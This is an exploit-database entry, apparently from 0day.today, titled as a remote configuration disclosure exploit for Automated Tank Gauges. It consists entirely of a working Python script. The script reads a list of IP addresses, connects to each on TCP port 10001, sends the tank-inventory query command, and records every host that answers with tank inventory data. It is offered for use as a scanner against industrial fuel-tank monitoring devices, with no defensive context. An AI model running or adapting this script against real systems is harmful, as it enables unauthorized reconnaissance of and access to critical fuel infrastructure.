id: 38055
date: 11/04/2022
title: Automated Tank Gauge (ATG) Remote Configuration Disclosure Exploit
author: RoseSecurity
cves: 

#!/usr/bin/env python3

 
import time
import socket            
with open("/tmp/ATG_SCAN.txt",'r') as atg_file:
    for line in atg_file.read().splitlines():
        try:
            atg_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port = 10001
            search_str = 'IN-TANK INVENTORY'               
            msg = str('\x01' + 'I20100' + '\n').encode('ascii')
            atg_socket.connect((line, port))
            atg_socket.send(msg)
            time.sleep(.25)
            response = atg_socket.recv(1024).decode()
            if search_str in response:
                with open("/tmp/ATG_DEVICES.txt", 'a') as file2:
                    file2.write(line + "\t ->\tATG Device\n")
            else:
                continue
            atg_socket.close()   
        except:
            pass 
atg_file.close()

#  0day.today [2023-03-27]  #